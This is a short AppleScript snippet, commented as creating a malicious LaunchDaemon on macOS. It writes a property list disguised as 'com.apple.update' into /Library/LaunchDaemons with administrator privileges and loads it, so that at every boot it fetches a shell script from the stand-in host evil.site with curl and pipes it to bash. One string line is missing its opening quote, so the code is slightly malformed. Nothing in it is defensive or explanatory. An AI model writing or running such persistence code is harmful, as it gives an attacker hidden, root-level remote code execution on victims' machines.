-- Create a malicious LaunchDaemon
set plist to "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" & ¬
"<plist version=\"1.0\">\n<dict>\n" & ¬
"<key>Label</key><string>com.apple.update</string>\n" & ¬
"<key>ProgramArguments</key><array><string>/bin/bash</string><string>-c</string><string>curl -s https://evil.site/payload.sh | bash</string></array>\n" & ¬
"<key>RunAtLoad</key><true/>\n" & ¬
</dict>\n</plist>"

do shell script "echo " & quoted form of plist & " > /Library/LaunchDaemons/com.apple.update.plist" with administrator privileges
do shell script "launchctl load /Library/LaunchDaemons/com.apple.update.plist" with administrator privileges
